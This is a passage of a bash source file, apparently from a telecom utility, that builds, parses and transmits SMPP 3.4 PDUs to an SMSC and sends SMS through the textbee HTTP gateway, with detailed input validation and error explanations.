                printf 'field\t%d\t%s\tOctet-String\t%s\t%d octets\n' \
                    "$off" "$name" "${hex:$(( off * 2 )):$(( n * 2 ))}" "$n"
                off=$(( off + n ))
                ;;
        esac
        :
    done <<< "$layout"
    OTASM_SMPP_OFF=$off
    return 0
}

# --smpp-pdu <name|id> — name a command id and its direction.
otasm_smpp_pdu() {
    local q="${1:-}" id
    if [[ -z "$q" ]]; then
        printf 'ERROR\t--smpp-pdu needs a command name or a command id\n' >&2
        printf 'WHY\tnothing was named, so no command id, direction or PDU can be reported\n' >&2
        return 2
    fi
    if ! id=$(_otasm_smpp_id "$q"); then
        printf 'ERROR\tunknown SMPP command: %s\n' "$q" >&2
        printf 'WHY\tnot a name from the SMPP 3.4 PDU table nor a command id in 0x00000000-0xFFFFFFFF (Table 5-2); names look like submit_sm or submit_sm_resp and ids like 4 or 0x80000004\n' >&2
        return 1
    fi
    if ! _otasm_smpp_info "$id"; then
        printf 'ERROR\t0x%s is not a PDU command id\n' "$id" >&2
        printf 'WHY\tthe SMPP 3.4 PDU table lists the request ids 0x00000001-0x00000113 and the responses 0x80000000-0x80000113; 0x%s is in neither list and has no direction\n' "$id" >&2
        return 1
    fi
    printf 'query\t0x%s\n' "$id"
    printf 'command_id\t%s\n' "$id"
    printf 'command_id_dec\t%d\n' "$(( 16#$id ))"
    printf 'name\t%s\n' "$OTASM_SMPP_NAME"
    printf 'kind\t%s\n' "$OTASM_SMPP_KIND"
    printf 'direction\t%s\n' "$OTASM_SMPP_DIR"
    if (( (16#$id & 0x80000000) != 0 )); then
        printf 'response_bit\t1\n'
    else
        printf 'response_bit\t0\n'
    fi
}

# --smpp-build <pdu> [--flag value ...] — submit_sm, deliver_sm, bind_transceiver.
otasm_smpp_build() {
    local pdu="${1:-}" tlv=0
    shift || true
    pdu="${pdu,,}"
    pdu="${pdu//-/_}"
    local src='' dst='' msg='' service_type=''
    local dcs='00' rd='00' seq='1' esm_class='00' protocol_id='00' priority='00'
    local sm_default_msg_id='00' src_ton='05' src_npi='00' dst_ton='01' dst_npi='01'
    local system_id='' password='' system_type='' interface_version='0x34'
    local addr_ton='00' addr_npi='00' address_range=''
    while (($#)); do
        case "$1" in
            --src|--dst|--msg|--service-type|--dcs|--rd|--seq|--esm-class|--protocol-id|--priority|--sm-default-msg-id|--src-ton|--src-npi|--dst-ton|--dst-npi|--system-id|--password|--system-type|--interface-version|--addr-ton|--addr-npi|--address-range)
                if (($# < 2)); then
                    printf 'ERROR\t%s needs a value\n' "$1" >&2
                    printf 'WHY\t--smpp-build takes "--flag value" pairs; a flag with no value has no encoding\n' >&2
                    return 2
                fi
                case "$1" in
                    --src)               src="$2" ;;
                    --dst)               dst="$2" ;;
                    --msg)               msg="$2" ;;
                    --service-type)      service_type="$2" ;;
                    --dcs)               dcs="$2" ;;
                    --rd)                rd="$2" ;;
                    --seq)               seq="$2" ;;
                    --esm-class)         esm_class="$2" ;;
                    --protocol-id)       protocol_id="$2" ;;
                    --priority)          priority="$2" ;;
                    --sm-default-msg-id) sm_default_msg_id="$2" ;;
                    --src-ton)           src_ton="$2" ;;
                    --src-npi)           src_npi="$2" ;;
                    --dst-ton)           dst_ton="$2" ;;
                    --dst-npi)           dst_npi="$2" ;;
                    --system-id)         system_id="$2" ;;
                    --password)          password="$2" ;;
                    --system-type)       system_type="$2" ;;
                    --interface-version) interface_version="$2" ;;
                    --addr-ton)          addr_ton="$2" ;;
                    --addr-npi)          addr_npi="$2" ;;
                    --address-range)     address_range="$2" ;;
                esac
                shift 2
                ;;
            --tlv) tlv=1; shift ;;
            *)
                printf 'ERROR\tunknown option: %s\n' "$1" >&2
                printf 'WHY\t--smpp-build accepts --src --dst --msg --service-type --dcs --rd --seq --src-ton --src-npi --dst-ton --dst-npi --esm-class --protocol-id --priority --sm-default-msg-id --system-id --password --system-type --interface-version --addr-ton --addr-npi --address-range\n' >&2
                return 2
                ;;
        esac
    done
    case "$pdu" in
        submit_sm|deliver_sm|bind_transceiver) ;;
        '')
            printf 'ERROR\t--smpp-build needs a PDU name\n' >&2
            printf 'WHY\tthis tree builds submit_sm, deliver_sm and bind_transceiver\n' >&2
            return 2 ;;
        *)
            printf 'ERROR\t--smpp-build does not build %s\n' "$pdu" >&2
            printf 'WHY\tthis tree builds submit_sm, deliver_sm and bind_transceiver; submit_multi (destination lists), data_sm and the broadcast PDUs have bodies whose field order this builder does not encode, so no PDU is invented for them. --smpp-parse walks submit_multi and data_sm back, and --smpp-tlv composes one optional parameter at a time\n' >&2
            return 2 ;;
    esac
    if (( tlv )); then
        printf 'ERROR\t--smpp-build does not append optional parameters to a built PDU\n' >&2
        printf 'WHY\tthe builder emits the mandatory body fields; a TLV is tag(2) length(2) value(length) and can be composed one at a time with --smpp-tlv, which prints the octets to append and the length that has to change with them\n' >&2
        return 2
    fi
    local v f
    if ! v=$(_otasm_smpp_uint sequence_number "$seq"); then return 2; fi
    if (( v < 1 || v > 0x7fffffff )); then
        printf 'ERROR\tsequence_number %d is outside 1..0x7FFFFFFF\n' "$v" >&2
        printf 'WHY\tSMPP 3.4 reserves 0x00000000 and keeps bit 31 clear in a request sequence number; %d does not fit that range\n' "$v" >&2
        return 2
    fi
    seq=$v
    for f in src_ton src_npi dst_ton dst_npi esm_class protocol_id priority sm_default_msg_id addr_ton addr_npi interface_version; do
        if ! v=$(_otasm_smpp_uint "$f" "${!f}"); then return 2; fi
        if (( v > 255 )); then
            printf 'ERROR\t%s is %d and does not fit its one-octet field\n' "$f" "$v" >&2
            printf 'WHY\tthe SMPP body carries %s as a single octet; a value above 255 has no encoding\n' "$f" >&2
            return 2
        fi
        printf -v "$f" '%d' "$v"
    done
    if ! v=$(_otasm_smpp_uint data_coding "$dcs"); then return 2; fi
    if (( v > 255 )); then
        printf 'ERROR\tdata_coding %d does not fit its one-octet field\n' "$v" >&2
        printf 'WHY\tdata_coding is a single octet; a value above 255 has no encoding\n' >&2
        return 2
    fi
    dcs=$v
    if ! v=$(_otasm_smpp_uint registered_delivery "$rd"); then return 2; fi
    if (( v > 0x1f )); then
        printf 'ERROR\tregistered_delivery 0x%02x sets reserved bits\n' "$v" >&2
        printf 'WHY\tbits 5-7 of registered_delivery are reserved in SMPP 3.4; only the receipt (bits 0-1), the SME acknowledgement (bits 2-3) and the intermediate notification (bit 4) are encodable, so 0x%02x is refused\n' "$v" "$v" >&2
        return 2
    fi
    rd=$v
    local body='' cmd_id='' dir='' msg_hex='' sm_len_hex=''
    case "$pdu" in
        submit_sm|deliver_sm)
            if [[ "$pdu" == "submit_sm" ]]; then
                cmd_id='00000004'
                dir='esme->smsc'
            else
                cmd_id='00000005'
                dir='smsc->esme'
            fi
            msg_hex=$(otasm_norm_hex "$msg")
            if [[ -n "$msg_hex" ]]; then
                if [[ ! "$msg_hex" =~ ^[0-9a-f]+$ ]] || (( ${#msg_hex} % 2 )); then
                    printf 'ERROR\tshort_message is not whole octets of hex: %s\n' "$msg" >&2
                    printf 'WHY\tshort_message is an Octet String counted by sm_length; an odd digit or a non-hex character cannot be rounded without inventing an octet\n' >&2
                    return 1
                fi
            fi
            if (( ${#msg_hex} / 2 > 254 )); then
                printf 'ERROR\tshort_message is %d octets\n' "$(( ${#msg_hex} / 2 ))" >&2
                printf 'WHY\tSMPP 3.4 caps short_message at 254 octets and sm_length is one octet; longer content must ride in the message_payload optional parameter, which this builder does not encode\n' >&2
                return 1
            fi
            sm_len_hex=$(printf '%02x' "$(( ${#msg_hex} / 2 ))")
            body=$(_otasm_smpp_cstr "$service_type" 6 service_type) || return 1
            body+="$(_otasm_smpp_u8 "$src_ton")$(_otasm_smpp_u8 "$src_npi")"
            body+="$(_otasm_smpp_cstr "$src" 21 source_addr)" || return 1
            body+="$(_otasm_smpp_u8 "$dst_ton")$(_otasm_smpp_u8 "$dst_npi")"
            body+="$(_otasm_smpp_cstr "$dst" 21 destination_addr)" || return 1
            body+="$(_otasm_smpp_u8 "$esm_class")$(_otasm_smpp_u8 "$protocol_id")$(_otasm_smpp_u8 "$priority")"
            body+='0000'
            body+="$(_otasm_smpp_u8 "$rd")"
            body+='00'
            body+="$(_otasm_smpp_u8 "$dcs")"
            body+="$(_otasm_smpp_u8 "$sm_default_msg_id")"
            body+="$sm_len_hex$msg_hex"
            ;;
        bind_transceiver)
            cmd_id='00000009'
            dir='esme->smsc'
            if [[ -z "$system_id" ]]; then
                printf 'ERROR\tsystem_id is empty\n' >&2
                printf 'WHY\tsystem_id identifies the ESME in a bind (1-16 octets); an empty identity is not a bind this builder will invent\n' >&2
                return 2
            fi
            if [[ -z "$password" ]]; then
                printf 'ERROR\tpassword is empty\n' >&2
                printf 'WHY\tbind_transceiver carries the ESME password (1-9 octets); an empty one is not written in place of what was asked for\n' >&2
                return 2
            fi
            body=$(_otasm_smpp_cstr "$system_id" 16 system_id) || return 1
            body+="$(_otasm_smpp_cstr "$password" 9 password)" || return 1
            body+="$(_otasm_smpp_cstr "$system_type" 13 system_type)" || return 1
            body+="$(_otasm_smpp_u8 "$interface_version")"
            body+="$(_otasm_smpp_u8 "$addr_ton")$(_otasm_smpp_u8 "$addr_npi")"
            body+="$(_otasm_smpp_cstr "$address_range" 41 address_range)" || return 1
            ;;
    esac
    local len=$(( 16 + ${#body} / 2 )) hex
    hex="$(printf '%08x' "$len")${cmd_id}00000000$(printf '%08x' "$seq")${body}"
    printf 'pdu\t%s\n' "$pdu"
    printf 'command_id\t%s\n' "$cmd_id"
    printf 'direction\t%s\n' "$dir"
    printf 'command_length\t%d\n' "$len"
    printf 'sequence_number\t%08x\n' "$seq"
    if [[ "$pdu" == "bind_transceiver" ]]; then
        printf 'system_id\t%s\n' "$system_id"
        printf 'password\t%s\n' "$password"
        printf 'system_type\t%s\n' "${system_type:-(null)}"
        printf 'interface_version\t%s\n' "$(_otasm_smpp_u8 "$interface_version")"
        printf 'addr_ton\t%s\n' "$(_otasm_smpp_u8 "$addr_ton")"
        printf 'addr_npi\t%s\n' "$(_otasm_smpp_u8 "$addr_npi")"
        printf 'address_range\t%s\n' "${address_range:-(null)}"
    else
        printf 'service_type\t%s\n' "${service_type:-(null)}"
        printf 'source_addr\t%s\n' "${src:-(null)}"
        printf 'destination_addr\t%s\n' "${dst:-(null)}"
        printf 'data_coding\t%s\n' "$(_otasm_smpp_u8 "$dcs")"
        printf 'registered_delivery\t%s\n' "$(_otasm_smpp_u8 "$rd")"
        printf 'short_message\t%s\n' "$msg_hex"
        printf 'short_message_octets\t%d\n' "$(( ${#msg_hex} / 2 ))"
    fi
    printf 'octets\t%d\n' "$len"
    printf 'hex\t%s\n' "$hex"
    printf 'built\tyes\n'
}

# --smpp-send — carry a built PDU to an SMSC over TCP and read the answer.
# The octets come from otasm_smpp_build; tools/smpp_client.py owns the frame
# read because a shell cannot honour a deadline on "length octets, then again".
# No SIM is involved anywhere in this path: an SMSC authenticates an ESME by
# system_id/password in bind_transceiver (SMPP 3.4 5.2.1), not by a subscriber.
otasm_smpp_send() {
    local host='' port='2775' timeout='10' no_bind=0 dry=0
    local src='' dst='' msg='' text='' seq='1' dcs=''
    local system_id='' password='' system_type='' interface_version=''
    local -a build_args=()
    while (($#)); do
        case "$1" in
            --host|--port|--timeout|--msg|--text|--dcs|--src|--dst|--seq|\
            --service-type|--src-ton|--src-npi|--dst-ton|--dst-npi|\
            --system-id|--password|--system-type|--interface-version)
                if (($# < 2)); then
                    printf 'ERROR\t%s needs a value\n' "$1" >&2
                    printf 'WHY\t--smpp-send takes "--flag value" pairs; a flag with no value has no encoding\n' >&2
                    return 2
                fi
                case "$1" in
                    --host)    host="$2" ;;
                    --port)    port="$2" ;;
                    --timeout) timeout="$2" ;;
                    --msg)     msg="$2"; build_args+=(--msg "$2") ;;
                    --text)    text="$2" ;;
                    --dcs)     dcs="$2"; build_args+=(--dcs "$2") ;;
                    --seq)     seq="$2" ;;
                    --system-id)         system_id="$2" ;;
                    --password)          password="$2" ;;
                    --system-type)       system_type="$2" ;;
                    --interface-version) interface_version="$2" ;;
                    *)         build_args+=("$1" "$2") ;;
                esac
                shift 2
                ;;
            --no-bind)   no_bind=1; shift ;;
            --dry-run)   dry=1; shift ;;
            *)
                printf 'ERROR\tunknown option: %s\n' "$1" >&2
                printf 'WHY\t--smpp-send accepts --host --port --timeout --dst --src --msg --text --dcs --rd --seq --service-type --src-ton --src-npi --dst-ton --dst-npi --system-id --password --system-type --interface-version --no-bind --dry-run\n' >&2
                return 2
                ;;
        esac
    done
    if [[ -z "$host" ]]; then
        printf 'ERROR\t--smpp-send needs --host\n' >&2
        printf 'WHY\tno SMSC address was given, so there is nowhere to open a session; --smpp-build alone emits octets and transmits nothing\n' >&2
        return 2
    fi
    if [[ ! "$host" =~ ^[A-Za-z0-9._:-]+$ ]]; then
        printf 'ERROR\t--host is not a hostname or address: %s\n' "$host" >&2
        printf 'WHY\tthe value is passed to a socket connect; anything outside letters, digits, dot, colon, underscore and hyphen has no address form here\n' >&2
        return 2
    fi
    if [[ ! "$port" =~ ^[0-9]+$ ]] || (( port < 1 || port > 65535 )); then
        printf 'ERROR\t--port is not in 1..65535: %s\n' "$port" >&2
        printf 'WHY\tport 2775 is the SMPP assignment; any port outside 1..65535 has no TCP encoding\n' >&2
        return 2
    fi
    if [[ ! "$timeout" =~ ^[0-9]+$ ]] || (( timeout < 1 || timeout > 600 )); then
        printf 'ERROR\t--timeout is not in 1..600 seconds: %s\n' "$timeout" >&2
        printf 'WHY\tthe deadline bounds the bind and every response read; zero would fail before the SMSC answers and above 600 the harness timeout fires first\n' >&2
        return 2
    fi
    if [[ -z "$dst" ]]; then
        # the destination rides in build_args; keep a copy for the pre-flight gate
        local i
        for ((i = 0; i < ${#build_args[@]}; i++)); do
            if [[ "${build_args[i]}" == "--dst" ]]; then dst="${build_args[i+1]:-}"; fi
        done
    fi
    if [[ -z "$dst" ]]; then
        printf 'ERROR\t--smpp-send needs --dst\n' >&2
        printf 'WHY\tsubmit_sm carries destination_addr (SMPP 3.4 5.2.5); without a destination the SMSC has no subscriber to route to and the PDU is not a submission\n' >&2
        return 2
    fi
    : "${system_id:=${OTASM_SMPP_SYSTEM_ID:-}}"
    : "${password:=${OTASM_SMPP_PASSWORD:-}}"
    if [[ -n "$system_id" && -z "$password" ]]; then
        printf 'ERROR\tsystem_id was given with no password\n' >&2
        printf 'WHY\tbind_transceiver carries both (5.2.1); set OTASM_SMPP_PASSWORD instead of --password to keep it out of the process list\n' >&2
        return 2
    fi
    local msg_hex=''
    if [[ -n "$text" && -n "$msg" ]]; then
        printf 'ERROR\t--text and --msg were both given\n' >&2
        printf 'WHY\t--text is packed into short_message as GSM 7-bit and --msg is short_message octets already; two sources for one field cannot both be honoured\n' >&2
        return 2
    fi
    if [[ -n "$text" ]]; then
        msg_hex=$(otasm_tp_pack_text "$text") || return 1
        build_args=(--msg "$msg_hex" "${build_args[@]}")
        printf 'text\t%s\n' "$text"
        printf 'text_septets\t%d\n' "${#text}"
        printf 'text_short_message\t%s\n' "$msg_hex"
    elif [[ -n "$msg" ]]; then
        msg_hex=$(otasm_norm_hex "$msg")
    else
        printf 'ERROR\t--smpp-send needs --text or --msg\n' >&2
        printf 'WHY\tshort_message is the payload of the submission; an empty one is not sent in place of what was asked for\n' >&2
        return 2
    fi
    if [[ ! "$seq" =~ ^[0-9]+$ ]] && [[ ! "$seq" =~ ^0x[0-9a-fA-F]+$ ]]; then
        printf 'ERROR\t--seq is not an integer: %s\n' "$seq" >&2
        printf 'WHY\tsequence_number is a 31-bit integer field; %s has no encoding\n' "$seq" >&2
        return 2
    fi
    local seq_dec=$seq
    if [[ "$seq" =~ ^0x ]]; then seq_dec=$(( seq )); fi
    if (( seq_dec < 1 || seq_dec + 1 > 0x7fffffff )); then
        printf 'ERROR\t--seq %d leaves no room for the submit sequence number\n' "$seq_dec" >&2
        printf 'WHY\tthe bind takes --seq and the submit takes --seq+1, and SMPP 3.4 5.1.2 keeps both inside 1..0x7FFFFFFF\n' >&2
        return 2
    fi
    local hex bind_hex='' submit_hex='' rows
    rows=$(otasm_smpp_build submit_sm "${build_args[@]}" --seq "$(( seq_dec + 1 ))") || return $?
    submit_hex=$(printf '%s\n' "$rows" | awk -F'\t' '$1 == "hex" { print $2; exit }')
    if [[ -z "$submit_hex" ]]; then
        printf 'ERROR\tthe submit_sm builder returned no octets\n' >&2
        printf 'WHY\tan empty hex row means the PDU was not assembled, and sending a headerless stream would desynchronise the session\n' >&2
        return 1
    fi
    if (( no_bind == 0 )) && [[ -n "$system_id" ]]; then
        local -a bind_args=(--system-id "$system_id" --password "$password" --seq "$seq_dec")
        [[ -n "$system_type" ]] && bind_args+=(--system-type "$system_type")
        [[ -n "$interface_version" ]] && bind_args+=(--interface-version "$interface_version")
        rows=$(otasm_smpp_build bind_transceiver "${bind_args[@]}") || return $?
        bind_hex=$(printf '%s\n' "$rows" | awk -F'\t' '$1 == "hex" { print $2; exit }')
        if [[ -z "$bind_hex" ]]; then
            printf 'ERROR\tthe bind_transceiver builder returned no octets\n' >&2
            printf 'WHY\tan empty hex row means the bind was not assembled, and submitting on an unbound session is refused by every SMSC\n' >&2
            return 1
        fi
        printf 'bind_octets\t%d\n' "$(( ${#bind_hex} / 2 ))"
    else
        printf 'bind\tnot-requested\n'
    fi
    printf 'submit_octets\t%d\n' "$(( ${#submit_hex} / 2 ))"
    printf 'submit_hex\t%s\n' "$submit_hex"
    if (( no_bind )) && [[ -n "$system_id" ]]; then
        printf 'note\t--no-bind leaves the session unbound; the SMSC answers an unbound submit_sm with ESME_RINVBNDSTS (0x00000004)\n'
    fi
    if (( dry )); then
        printf 'dry_run\tno socket opened\n'
        printf 'sent\tno\n'
        return 0
    fi
    local py="${IMSISTING_ROOT:-.}/tools/smpp_client.py"
    if ! command -v python3 >/dev/null 2>&1; then
        printf 'ERROR\tpython3 is not on PATH\n' >&2
        printf 'WHY\ttools/smpp_client.py frames the session; without an interpreter the PDU has no transport, and this verb will not open a raw socket behind your back\n' >&2
        return 1
    fi
    if [[ ! -r "$py" ]]; then
        printf 'ERROR\ttools/smpp_client.py is missing under %s\n' "${IMSISTING_ROOT:-.}" >&2
        printf 'WHY\tthe transport lives in that file; without it the octets above were built but nothing can carry them\n' >&2
        return 1
    fi
    local -a cargs=(--host "$host" --port "$port" --timeout "$timeout" --submit "$submit_hex")
    if [[ -n "$bind_hex" && $no_bind -eq 0 ]]; then cargs+=(--bind "$bind_hex"); else cargs+=(--no-bind); fi
    local rc=0
    python3 "$py" "${cargs[@]}" || rc=$?
    return "$rc"
}

# --smpp-parse <hex> — header, then one row per body field with its offset.
otasm_smpp_parse() {
    local raw="${1:-}" hex
    hex=$(otasm_norm_hex "$raw")
    if [[ -z "$hex" ]]; then
        printf 'ERROR\t--smpp-parse needs a PDU in hex\n' >&2
        printf 'WHY\tnothing was given, so there is no header and no body to decode\n' >&2
        return 2
    fi
    if [[ ! "$hex" =~ ^[0-9a-f]+$ ]] || (( ${#hex} % 2 )); then
        printf 'ERROR\tnot a whole number of hex octets: %s\n' "$raw" >&2
        printf 'WHY\ta PDU is octets; an odd hex digit or a character outside 0-9a-f cannot be decoded without inventing an octet\n' >&2
        return 1
    fi
    local total=$(( ${#hex} / 2 ))
    if (( total < 16 )); then
        printf 'ERROR\t%d octets is shorter than the 16-octet SMPP header\n' "$total" >&2
        printf 'WHY\tthe header is command_length, command_id, command_status and sequence_number, four octets each (§4.1); a shorter frame has no command id to decode\n' >&2
        return 1
    fi
    local cid="${hex:8:8}" clen=$(( 16#${hex:0:8} ))
    _otasm_smpp_header_tsv "$hex" "$cid"
    printf 'body_octets\t%d\n' "$(( total - 16 ))"
    if (( clen != total )); then
        printf 'command_length_actual\t%d\n' "$total"
        printf 'parsed\tno\n'
        printf 'ERROR\tcommand_length says %d octets but the PDU is %d\n' "$clen" "$total" >&2
        printf 'WHY\tthe length field is the first four octets and must equal the whole PDU (§4.1); a consumer would take %d octets and this input is not that frame, so no body is decoded as if the field were right\n' "$clen" >&2
        return 1
    fi
    if ! _otasm_smpp_info "$cid"; then
        printf 'parsed\tno\n'
        printf 'ERROR\tcommand id 0x%s is not in the SMPP 3.4 PDU table\n' "$cid" >&2
        printf 'WHY\twithout a PDU definition the body has no field list; nothing is decoded (Table 5-2)\n' >&2
        return 1
    fi
    local layout
    if ! layout=$(_otasm_smpp_layout "$cid"); then
        printf 'parsed\tno\n'
        printf 'ERROR\t%s has no layout in this module\n' "$OTASM_SMPP_NAME" >&2
        printf 'WHY\tthis parser walks the layouts it has established (bind_*, submit_sm, deliver_sm, their responses and query_sm_resp); %s is defined by SMPP 3.4 but its body is not walked here, so no field values are guessed\n' "$OTASM_SMPP_NAME" >&2
        return 1
    fi
    if ! _otasm_smpp_walk_body "$hex" 16 "$total" "$layout"; then
        printf 'parsed\tno\n'
        return 1
    fi
    if (( OTASM_SMPP_OFF < total )); then
        printf 'optional_parameters\t%d\n' "$(( total - OTASM_SMPP_OFF ))"
        printf 'optional_parameters_hex\t%s\n' "${hex:$(( OTASM_SMPP_OFF * 2 ))}"
        OTASM_SMPP_TLVS=0
        if ! _otasm_smpp_walk_tlvs "$hex" "$OTASM_SMPP_OFF" "$total"; then
            printf 'optional_parameters_decoded\tno\n'
            printf 'parsed\tno\n'
            return 1
        fi
        printf 'optional_parameters_decoded\tyes\n'
        printf 'optional_parameter_count\t%d\n' "$OTASM_SMPP_TLVS"
    fi
    printf 'parsed\tyes\n'
}

# --http-send — hand a message to an HTTP SMS gateway; an Android phone with a
# SIM does the transmitting at the far end. One provider's request shape is
# quoted here instead of guessed: textbee POST /api/v1/gateway/send-sms with an
# x-api-key header and a body of {"message","recipients","deviceId"?}, read
# from that project's own openapi.json (SendSMSRequestDTO). This path needs a
# SIM somewhere -- on the phone, not in this machine.
otasm_json_escape() {  # <text> -> JSON string body, quotes included by caller
    local s="${1:-}" out='' c i
    for ((i = 0; i < ${#s}; i++)); do
        c="${s:i:1}"
        case "$c" in
            '"')   out+='\"' ;;
            '\')   out+='\\' ;;
            $'\n') out+='\n' ;;
            $'\r') out+='\r' ;;
            $'\t') out+='\t' ;;
            $'\b') out+='\b' ;;
            $'\f') out+='\f' ;;
            *)     out+="$c" ;;
        esac
    done
    printf '%s' "$out"
}

# Read one gateway response and name the fields it carries. Without python3 the
# octets are printed and nothing is claimed about their meaning.
otasm_http_report() {  # <json-file>
    if command -v python3 >/dev/null 2>&1; then
        python3 - "$1" <<'PY'
import json
import sys

try:
    with open(sys.argv[1], 'rb') as handle:
        doc = json.load(handle)
except Exception as exc:                                    # noqa: BLE001
    print("http_body_parsed\tno\t%s" % exc)
    raise SystemExit(3)

data = doc.get("data", doc) if isinstance(doc, dict) else doc
names = (
    ("success", "http_success"),
    ("message", "http_message"),
    ("smsBatchId", "http_sms_batch_id"),
    ("recipientCount", "http_recipient_count"),
    ("successCount", "http_success_count"),
    ("failureCount", "http_failure_count"),
    ("estimatedCompletionAt", "http_eta"),
    ("warning", "http_warning"),
)
if isinstance(data, dict):
    for key, name in names:
        value = data.get(key)
        if value is None:
            continue
        if isinstance(value, bool):
            value = "true" if value else "false"
        print("%s\t%s" % (name, value))
print("http_body_parsed\tyes")
PY
        return $?
    fi
    printf 'http_body_parsed\tno\tno python3 to read the JSON\n'
    return 0
}

otasm_http_send() {
    local api='textbee' base='' key='' device_id='' dst='' text='' timeout='20'
    local dry=0 raw=0
    while (($#)); do
        case "$1" in
            --api|--base|--api-key|--device-id|--dst|--text|--timeout)
                if (($# < 2)); then
                    printf 'ERROR\t%s needs a value\n' "$1" >&2
                    printf 'WHY\t--http-send takes "--flag value" pairs; a flag with no value has no request field\n' >&2
                    return 2
                fi
                case "$1" in
                    --api)       api="$2" ;;
                    --base)      base="$2" ;;
                    --api-key)   key="$2" ;;
                    --device-id) device_id="$2" ;;
                    --dst)       dst="$2" ;;
                    --text)      text="$2" ;;
                    --timeout)   timeout="$2" ;;
                esac
                shift 2
                ;;
            --dry-run) dry=1; shift ;;
            --raw)     raw=1; shift ;;
            *)
                printf 'ERROR\tunknown option: %s\n' "$1" >&2
                printf 'WHY\t--http-send accepts --api --base --api-key --device-id --dst --text --timeout --dry-run --raw\n' >&2
                return 2
                ;;
        esac
    done

    local path=''
    case "$api" in
        textbee)
            : "${base:=https://api.textbee.dev}"
            path='/api/v1/gateway/send-sms'
            ;;
        *)
            printf 'ERROR\t--api %s has no request shape in this module\n' "$api" >&2
            printf 'WHY\tonly textbee'"'"'s POST /api/v1/gateway/send-sms is quoted here (its openapi.json, SendSMSRequestDTO); another gateway needs its own endpoint, auth header and body field names from its own API document, and inventing them would be a guess -- use --base with --api textbee only if that host speaks the same shape\n' >&2
            return 2
            ;;
    esac

    if [[ ! "$base" =~ ^https?://[A-Za-z0-9._:/-]+$ ]]; then
        printf 'ERROR\t--base is not an http(s) URL: %s\n' "$base" >&2
        printf 'WHY\tthe value is handed to curl as a URL; anything outside letters, digits, dot, colon, slash and hyphen is not part of one\n' >&2
        return 2
    fi
    base="${base%/}"
    if [[ ! "$timeout" =~ ^[0-9]+$ ]] || (( timeout < 1 || timeout > 600 )); then
        printf 'ERROR\t--timeout is not in 1..600 seconds: %s\n' "$timeout" >&2
        printf 'WHY\tthe deadline bounds the request; zero would fail before the gateway answers and above 600 the harness timeout fires first\n' >&2
        return 2
    fi
    : "${key:=${OTASM_HTTP_KEY:-}}"
    if [[ -z "$key" ]]; then
        if (( dry == 0 )); then
            printf 'ERROR\tthe gateway needs an API key and none was given\n' >&2
            printf 'WHY\tevery request carries it in the x-api-key header (textbee openapi security scheme); set OTASM_HTTP_KEY or pass --api-key, and the environment is the safer of the two because --api-key is visible in the process list\n' >&2
            return 2
        fi
    fi

    if [[ -z "$dst" ]]; then
        printf 'ERROR\t--http-send needs --dst\n' >&2
        printf 'WHY\tannotated in recipients; a message without a destination has nowhere to land and is not sent in place of what was asked for\n' >&2
        return 2
    fi
    if [[ ! "$dst" =~ ^\+?[0-9]{6,15}$ ]]; then
        printf 'ERROR\t--dst is not an international number: %s\n' "$dst" >&2
        printf 'WHY\tE.164 allows up to 15 digits with an optional leading +; the gateway routes by this number and a short code here addresses no subscriber\n' >&2
        return 2
    fi
    local recipient="+${dst#+}"
    if [[ -z "$text" ]]; then
        printf 'ERROR\t--http-send needs --text\n' >&2
        printf 'WHY\tmessage is the body of the request; an empty one would be sent in place of what was asked for\n' >&2
        return 2
    fi
    if [[ -n "$device_id" && ! "$device_id" =~ ^[A-Za-z0-9._-]+$ ]]; then
        printf 'ERROR\t--device-id is not a device id: %s\n' "$device_id" >&2
        printf 'WHY\tthe id is a 24-hex ObjectId from GET /api/v1/gateway/devices; anything else resolves to the default device or nothing\n' >&2
        return 2
    fi

    local esc body url octets
    esc=$(otasm_json_escape "$text")
    body="{\"message\":\"$esc\",\"recipients\":[\"$recipient\"]"
    [[ -n "$device_id" ]] && body+=",\"deviceId\":\"$device_id\""
    body+='}'
    url="$base$path"
    octets=$(printf '%s' "$text" | wc -c | tr -d ' ')

    printf 'http_api\t%s\n'      "$api"
    printf 'http_method\tPOST\n'
    printf 'http_url\t%s\n'      "$url"
    printf 'http_recipient\t%s\n' "$recipient"
    printf 'recipient_rule\tE.164, up to 15 digits\n'
    printf 'http_device_id\t%s\n' "${device_id:-default-device}"
    printf 'http_api_key\t%s\n'  "$([[ -n "$key" ]] && echo present || echo absent)"
    printf 'text\t%s\n'          "$text"
    printf 'text_octets\t%s\n'   "$octets"
    printf 'http_body\t%s\n'     "$body"
    printf 'http_body_octets\t%s\n' "$(printf '%s' "$body" | wc -c | tr -d ' ')"

    if (( dry )); then
        printf 'dry_run\tno request sent\n'
        printf 'sent\tno\n'
        return 0
    fi
    if ! command -v curl >/dev/null 2>&1; then
        printf 'ERROR\tcurl is not installed\n' >&2
        printf 'WHY\tthe request is carried by curl, which is the only HTTP client this module shells out to; --dry-run prints the exact URL, header and body it would send\n' >&2
        return 3
    fi
    local tmp code rc
    tmp=$(mktemp "${TMPDIR:-/tmp}/otasm-http.XXXXXX") || return 3
    code=$(curl -sS -o "$tmp" -w '%{http_code}' --max-time "$timeout" \
                -H "x-api-key: $key" -H 'content-type: application/json' \
                --data-binary "$body" "$url" 2>"$tmp.err")
    rc=$?
    if (( rc != 0 )); then
        printf 'ERROR\tthe request did not complete\n' >&2
        printf 'WHY\tcurl exit %d: %s\n' "$rc" "$(tr '\n' ' ' < "$tmp.err")" >&2
        rm -f "$tmp" "$tmp.err"
        return 3
    fi
    printf 'http_status\t%s\n' "$code"
    if (( raw )); then
        printf 'http_body_raw\t%s\n' "$(tr -d '\n' < "$tmp")"
    fi
    otasm_http_report "$tmp"
    case "$code" in
        200) : ;;
        400) printf 'ERROR\tthe gateway refused the send\n' >&2
             printf 'WHY\t400: no enabled device to send from, the device is disabled, the account email is not verified, or the message could not be pushed to the phone -- GET /api/v1/gateway/devices names the devices this key can reach (openapi 400)\n' >&2
             rm -f "$tmp" "$tmp.err"; return 1 ;;
        401) printf 'ERROR\tthe API key was not accepted\n' >&2
             printf 'WHY\t401: the key is missing, invalid or revoked; it is per account and rotates from the textbee dashboard (openapi 401)\n' >&2
             rm -f "$tmp" "$tmp.err"; return 1 ;;
        429) printf 'ERROR\tthe plan limit is used up\n' >&2
             printf 'WHY\t429: a daily, monthly or per-batch limit was hit; the response body says which one (openapi 429)\n' >&2
             rm -f "$tmp" "$tmp.err"; return 1 ;;
        *)   printf 'ERROR\tthe gateway answered %s, which this verb does not interpret\n' "$code" >&2
             printf 'WHY\tonly 200/400/401/429 are documented for this endpoint; --raw prints the body it returned\n' >&2
             rm -f "$tmp" "$tmp.err"; return 1 ;;
    esac
    printf 'sent\tyes\n'
